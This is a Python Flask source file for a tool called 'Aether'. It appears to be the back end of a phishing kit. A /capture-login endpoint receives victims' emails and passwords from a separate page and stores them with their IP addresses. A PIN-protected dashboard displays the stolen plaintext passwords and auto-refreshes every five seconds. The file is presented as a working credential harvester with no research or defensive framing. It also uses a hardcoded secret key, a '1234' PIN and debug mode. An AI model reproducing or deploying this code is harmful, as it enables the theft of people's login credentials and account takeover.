from flask import Flask, render_template, request, jsonify, session, redirect, url_for, render_template_string
import datetime
import json
from colorama import init, Fore, Style
import pandas as pd

init(autoreset=True)

app = Flask(__name__)
app.secret_key = 'aether_secret_key_access' # MUST be present for the lock to work

# --- CONFIG ---
ADMIN_PIN = "1234" 
captured_credentials = []

@app.route('/')
def index():
    return render_template('index.html')

# --- THE LOCK SCREEN ROUTE ---
@app.route('/login', methods=['GET', 'POST'])
def admin_login():
    error = None
    if request.method == 'POST':
        if request.form.get('pin') == ADMIN_PIN:
            session['admin_logged_in'] = True
            return redirect(url_for('admin_dashboard'))
        else:
            error = "INVALID PIN"
    
    return render_template_string(LOGIN_UI, error=error)

# --- THE DASHBOARD ROUTE ---
@app.route('/dashboard')
def admin_dashboard():
    # If the user hasn't entered the PIN, send them to the login page
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))

    recent = list(reversed(captured_credentials[-20:]))
    return render_template_string(DASHBOARD_UI, recent=recent, count=len(captured_credentials))

@app.route('/logout')
def logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('admin_login'))

# --- CAPTURE LOGIC ---
@app.route('/capture-login', methods=['POST'])
def capture_login():
    data = request.json
    email = data.get('useremail')
    password = data.get('userpass')
    if email and password:
        entry = {
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'email': email,
            'password': password,
            'ip': request.remote_addr
        }
        captured_credentials.append(entry)
        return jsonify({'status': 'success'})
    return jsonify({'status': 'error'}), 400

# --- HTML TEMPLATES (In-String for easy setup) ---

LOGIN_UI = '''
<body style="background:#0a0a0a; color:white; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh;">
    <div style="background:#111; padding:30px; border-radius:15px; border:1px solid #333; text-align:center;">
        <h2 style="color:#ff3e3e;">AETHER SYSTEM LOCK</h2>
        {% if error %}<p style="color:red;">{{error}}</p>{% endif %}
        <form method="POST">
            <input type="password" name="pin" placeholder="Enter PIN" style="padding:10px; margin:10px; border-radius:5px; border:1px solid #444; background:#222; color:white;"><br>
            <button type="submit" style="padding:10px 30px; background:#ff3e3e; color:white; border:none; border-radius:5px; cursor:pointer;">UNLOCK</button>
        </form>
    </div>
</body>
'''

DASHBOARD_UI = '''
<!DOCTYPE html>
<html>
<head>
    <title>Dashboard</title>
    <style>
        body { background:#0a0a0a; color:white; font-family:sans-serif; padding:20px; }
        .card { background:#111; padding:20px; border:1px solid #222; border-radius:10px; margin-bottom:10px; }
        .entry { display:grid; grid-template-columns: 1fr 2fr 2fr 1fr; padding:10px; border-bottom:1px solid #222; }
        .header { font-weight:bold; color:#ff3e3e; }
    </style>
    <meta http-equiv="refresh" content="5">
</head>
<body>
    <div style="display:flex; justify-content:space-between;">
        <h1>AETHER LOGS ({{count}})</h1>
        <a href="/logout" style="color:#ff3e3e;">[LOCK SYSTEM]</a>
    </div>
    <div class="card">
        <div class="entry header">
            <div>Time</div><div>Email</div><div>Password</div><div>IP</div>
        </div>
        {% for c in recent %}
        <div class="entry">
            <div>{{c.timestamp}}</div><div>{{c.email}}</div><div style="color:#0f0;">{{c.password}}</div><div>{{c.ip}}</div>
        </div>
        {% endfor %}
    </div>
</body>
</html>
'''
# it is end
if __name__ == "__main__":
    app.run(debug=True, port=5001)